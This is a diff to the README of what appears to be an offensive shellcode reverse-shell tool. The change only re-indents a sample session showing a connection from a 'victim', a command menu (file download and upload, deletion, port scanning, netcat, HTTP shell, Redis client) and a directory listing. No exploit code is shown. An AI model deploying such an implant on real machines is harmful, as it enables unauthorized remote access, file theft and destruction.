@@ -75,66 +75,65 @@ cargo build --release
   ```
 - Run the shellcode on victim
 - The server should reply `"Connection established from [IP]:[PORT]"`
-
-```
-[+] Connection established from 127.0.0.1:41248
-$ help
-
-    Core Commands
-    =============
-
-        Command                    Description                                    Syscalls
-        -------                    -------                                        -----------
-        help                       Print This Menu                                N/A
-        ls [DIR]                   List Directory                                 SYS_open, SYS_getdents
-        dir [DIR]                  List Directory                                 SYS_open, SYS_getdents
-        cat <FILE>                 Print File Content                             SYS_open, SYS_close
-        cd <DIR>                   Change Directory                               SYS_chdir
-        pwd                        Print Current Directory                        SYS_getcwd
-        download <FILE>            Download File                                  SYS_open, SYS_close
-        upload <FILE> [PERM]       Upload File                                    SYS_open, SYS_close
-        rm <FILE>                  Remove File                                    SYS_unlink
-        mv <SOURCE> <DEST>         Move File                                      SYS_rename
-        cp <SOURCE> <DEST> [PERM]  Copy File                                      SYS_open, SYS_close
-        mkdir <DIR> [PERM]         Create a Directory                             SYS_mkdir
-        rmdir <DIR>                Remove a Directory                             SYS_rmdir
-        getuid                     Get Current UID                                SYS_getuid
-        getgid                     Get Current GID                                SYS_getgid
-        portscan                   Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
-        netcat <INPUT_FILE> <Port> Send Data in the Input File to Port            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
-                                   and Receive Output
-        http-shell                 HTTP Interactive Shell                         SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
-        redis-cli                  Simple Redis Client                            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
-        exit                       Exit shell                                     N/A
-        quit                       Exit shell                                     N/A
-
-
-$ cd /
-[+] Directory changed to '/'
-$ ls
-[+] Listing directory '.'
-.
-..
-boot
-var
-dev
-run
-etc
-tmp
-sys
-proc
-usr
-bin
-home
-lib
-lib64
-mnt
-opt
-root
-sbin
-srv
-$ 
-```
+  ```
+  [+] Connection established from 127.0.0.1:41248
+  $ help
+  
+      Core Commands
+      =============
+  
+          Command                    Description                                    Syscalls
+          -------                    -------                                        -----------
+          help                       Print This Menu                                N/A
+          ls [DIR]                   List Directory                                 SYS_open, SYS_getdents
+          dir [DIR]                  List Directory                                 SYS_open, SYS_getdents
+          cat <FILE>                 Print File Content                             SYS_open, SYS_close
+          cd <DIR>                   Change Directory                               SYS_chdir
+          pwd                        Print Current Directory                        SYS_getcwd
+          download <FILE>            Download File                                  SYS_open, SYS_close
+          upload <FILE> [PERM]       Upload File                                    SYS_open, SYS_close
+          rm <FILE>                  Remove File                                    SYS_unlink
+          mv <SOURCE> <DEST>         Move File                                      SYS_rename
+          cp <SOURCE> <DEST> [PERM]  Copy File                                      SYS_open, SYS_close
+          mkdir <DIR> [PERM]         Create a Directory                             SYS_mkdir
+          rmdir <DIR>                Remove a Directory                             SYS_rmdir
+          getuid                     Get Current UID                                SYS_getuid
+          getgid                     Get Current GID                                SYS_getgid
+          portscan                   Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+          netcat <INPUT_FILE> <Port> Send Data in the Input File to Port            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+                                     and Receive Output
+          http-shell                 HTTP Interactive Shell                         SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+          redis-cli                  Simple Redis Client                            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+          exit                       Exit shell                                     N/A
+          quit                       Exit shell                                     N/A
+  
+  
+  $ cd /
+  [+] Directory changed to '/'
+  $ ls
+  [+] Listing directory '.'
+  .
+  ..
+  boot
+  var
+  dev
+  run
+  etc
+  tmp
+  sys
+  proc
+  usr
+  bin
+  home
+  lib
+  lib64
+  mnt
+  opt
+  root
+  sbin
+  srv
+  $ 
+  ```
 
 ## TODO
 
